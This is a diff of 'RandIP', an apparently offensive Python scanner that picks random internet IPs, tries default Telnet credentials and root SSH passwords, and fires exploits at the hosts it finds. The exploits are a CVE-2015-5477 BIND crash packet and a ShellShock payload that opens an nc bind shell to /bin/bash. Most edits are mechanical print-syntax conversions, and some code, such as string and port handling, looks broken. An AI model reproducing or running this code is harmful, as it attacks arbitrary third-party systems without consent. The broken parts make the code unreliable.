@@ -1,18 +1,18 @@
-#RandIP 0.9.7 beta#
+#RandIP 0.9.8 beta#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
 from random import randint
 from stem.util import term
-from PyQt4.QtGui import *
-from PyQt4.QtWebKit import *
+#from PyQt4.QtGui import *
+#from PyQt4.QtWebKit import *
 
 def UnknownError():#Catch all unknown errors and do an Emergency exit#
 	e = sys.exc_info()[0]
 	exc_type, exc_obj, exc_tb = sys.exc_info()
 	fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-	print(exc_type, fname, exc_tb.tb_lineno)
-	print("Uncaught error %s" % e)
+	print((exc_type, fname, exc_tb.tb_lineno))
+	print(("Uncaught error %s" % e))
 	fp = open("error.log", 'a')
 	fp.write("Script:")
 	fp.write(str(fname))
@@ -31,9 +31,9 @@ def UnknownError():#Catch all unknown errors and do an Emergency exit#
 	fp.write('\n')
 	fp.write('\n')
 	fp.close()
-	print('\n')*5
+	print(('\n')*5)
 	print("Error.log wrote to current directory...Check and report any unhandled exceptions or bugs to blmvxer@gmail.com\n")
-	print('\n')*5
+	print(('\n')*5)
 	print("sleeping for 5 seconds and then finishing exit")
 	time.sleep(5)
 	WriteLog()
@@ -80,10 +80,10 @@ def WriteLog():
 	zf = zipfile.ZipFile('randip_log.zip', mode='w')
 	try:
 		for hostlist in hostlog:
-			print('zipping ' + hostlist + ' to randip_log.zip\n')
+			print(('zipping ' + hostlist + ' to randip_log.zip\n'))
 			zf.write(hostlist)
 	except zipfile.BadZipfile:
-		print(zipfile.BadZipfile)
+		print((zipfile.BadZipfile))
 		zf.close()
 	except OSError:
 		print(OSError)
@@ -101,7 +101,7 @@ def WriteLog():
 
 def print_bootstrap_lines(line):
   if "Bootstrapped " in line:
-    print(term.format(line, term.Color.BLUE))
+    print((term.format(line, term.Color.BLUE)))
 
 def randip():
 	while True:
@@ -128,7 +128,7 @@ fp = open(logfile, 'w')
 #Custom Exploit Container
 def tBindDOS():
 	print('Using tBind CVE:2015-5477')
-	print('Sending packet to ' + address + ' ...')
+	print(('Sending packet to ' + address + ' ...'))
 	payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	sock.sendto(payload, (address, 53))
@@ -137,17 +137,17 @@ def tBindDOS():
 def ShellShock():
 	rport=80
 	print('Using ShellShock CVE:2014-6271(6278)')
-	print('Sending packet to ' + address + '...')
+	print(('Sending packet to ' + address + '...'))
 	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
 	try:
 		serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		time.sleep(1)
 		serversocket.connect(address)
 		print('[!] Successfully exploited')
-		print('[!] Connected to ', address)
+		print(('[!] Connected to ', address))
 		serversocket.settimeout(3)
 		while True:
-			reply = raw_input(address+"> ")
+			reply = input(address+"> ")
 			serversocket.sendall(reply+"\n")
 			data = serversocket.recv(buff)
 			print(data)
@@ -194,18 +194,18 @@ def TelnetConnect():
 		tn.write('admin' + '\n')
 		tn.write("ls\n")
 		tn.write("exit\n")
-		print tn.read_all()
+		print(tn.read_all())
 		d.append(tn.read_all())
 	except socket.error:
 		telend=time.clock()
 		totaltime = telend - telnettime
-		print(socket.error, 'Error Signing in or Telnet not accessible', address)
-		print '\n'
+		print((socket.error, 'Error Signing in or Telnet not accessible', address))
+		print('\n')
 		print(totaltime)
 		e.append(address)
 		pass
 	except EOFError:
-		print(EOFError, address)
+		print((EOFError, address))
 		d.append(address)
 		pass
 	except KeyboardInterrupt:
@@ -224,7 +224,7 @@ def SSHConnect():
 			SSH.connect(address, username='root', password=p)
 			stdin, stdout, stderr = client.exec_command('ls')
 			for line in stdout:
-				print '... ' + line.strip('\n')
+				print('... ' + line.strip('\n'))
 				client.close()
 				f.append(address)
 		except:
@@ -234,19 +234,19 @@ def SSHConnect():
 			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
 			print(total)
 	except socket.timeout:
-		print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
+		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
 		g.append(address)
 		pass
 	except socket.error:
-		print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
+		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
 		g.append(address)
 		pass
 	except paramiko.ssh_exception.SSHException:
-		print(paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address)
+		print((paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address))
 		g.append(address)
 		pass
 	except paramiko.ssh_exception.AuthenticationException:
-		print(paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address)
+		print((paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address))
 		g.append(address)
 		pass
 	except KeyboardInterrupt:
@@ -260,7 +260,7 @@ for address in randip():
 			s = socket.socket()
 			s.settimeout(1.8)
 			s.connect((address, 80))
-			print address, "WORKS!!!"
+			print(address, "WORKS!!!")
 			b.append(address)
 			DNS = socket.gethostbyaddr(address)
 			hostname = DNS[0]
@@ -272,17 +272,17 @@ for address in randip():
 			myhost = 'http://' + address
 			req = requests.get('http://' + address)
 			if str(req.status_code) == '200':
-				print(term.format('Response Code: ' + str(req.status_code) + ' Works', term.Color.GREEN))
+				print((term.format('Response Code: ' + str(req.status_code) + ' Works', term.Color.GREEN)))
 			elif str(req.status_code) == '400':
-				print(term.format('Response Code: ' + str(req.status_code) + ' Bad Request', term.Color.RED))
+				print((term.format('Response Code: ' + str(req.status_code) + ' Bad Request', term.Color.RED)))
 			elif str(req.status_code) == '401':
-				print(term.format('Response Code: ' + str(req.status_code) + ' Unauthorized', term.Color.YELLOW))
+				print((term.format('Response Code: ' + str(req.status_code) + ' Unauthorized', term.Color.YELLOW)))
 			elif str(req.status_code) == '403':
-				print(term.format('Response Code: ' + str(req.status_code) + ' Forbidden', term.Color.YELLOW))
+				print((term.format('Response Code: ' + str(req.status_code) + ' Forbidden', term.Color.YELLOW)))
 			elif str(req.status_code) == '404':
-				print(term.format('Response Code: ' + str(req.status_code) + ' Not Found', term.Color.RED))
+				print((term.format('Response Code: ' + str(req.status_code) + ' Not Found', term.Color.RED)))
 			else:
-				print('Response Code: ' + str(req.status_code))
+				print(('Response Code: ' + str(req.status_code)))
 			fpadr = open('host.' + address, 'w')
 			fpadr.write('Response Code: ' + str(req.status_code))
 			fpadr.write('\n')
@@ -291,12 +291,12 @@ for address in randip():
 			hostlog.append('host.' + address)
 			print('Beginning Service Discovery\n')
 			find_service_name()
-			print('Beginning Telnet attempt on %s\n' % address)
+			print(('Beginning Telnet attempt on %s\n' % address))
 			if Telio == 1:
 				TelnetConnect()
 			elif Telio == 0:
 				print('Telnet port not open...skipping\n')
-			print('Starting SSH Attempt on %s' % address)
+			print(('Starting SSH Attempt on %s' % address))
 			if SSHio == 1:
 				SSHConnect()
 			elif SSHio == 0:
@@ -306,46 +306,46 @@ for address in randip():
 			ShellShock()
 #End of Exploits
 		except socket.timeout:
-			print(socket.timeout, '%s timeout' % address)
-			print '\n'
+			print((socket.timeout, '%s timeout' % address))
+			print('\n')
 			a.append(address)
 			pass
 		except socket.herror:
-			print(socket.herror, 'Error getting host by address on %s' % address)
-			print '\n'
+			print((socket.herror, 'Error getting host by address on %s' % address))
+			print('\n')
 			a.append(address)
 			pass
 		except socket.error:
-			print(socket.error, 'Failed to connect to %s' % address)
-			print '\n'
+			print((socket.error, 'Failed to connect to %s' % address))
+			print('\n')
 			a.append(address)
 			pass
 		except requests.exceptions.HTTPError:
-			print(requests.exceptions.HTTPError, address)
+			print((requests.exceptions.HTTPError, address))
 			a.append(address)
 			pass
 		except requests.exceptions.ConnectionError:
-			print(requests.exceptions.ConnectionError, address)
+			print((requests.exceptions.ConnectionError, address))
 			a.append(address)
 			pass
 		except requests.packages.urllib3.exceptions.LocationValueError:
-			print(requests.packages.urllib3.exceptions.LocationValueError, address)
+			print((requests.packages.urllib3.exceptions.LocationValueError, address))
 			a.append(address)
 			pass
 		except requests.exceptions.ReadTimeout:
-			print(requests.exceptions.ReadTimeout, address)
+			print((requests.exceptions.ReadTimeout, address))
 			a.append(address)
 			pass
 		except requests.exceptions.TooManyRedirects:
-			print(requests.exceptions.TooManyRedirects, address)
+			print((requests.exceptions.TooManyRedirects, address))
 			a.append(address)
 			pass
 		except TypeError as e:
 			e = sys.exc_info()[0]
 			exc_type, exc_obj, exc_tb = sys.exc_info()
 			fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-			print(exc_type, fname, exc_tb.tb_lineno)
-			print(TypeError, address)
+			print((exc_type, fname, exc_tb.tb_lineno))
+			print((TypeError, address))
 			a.append(address)
 			pass
 		except Exception as e:
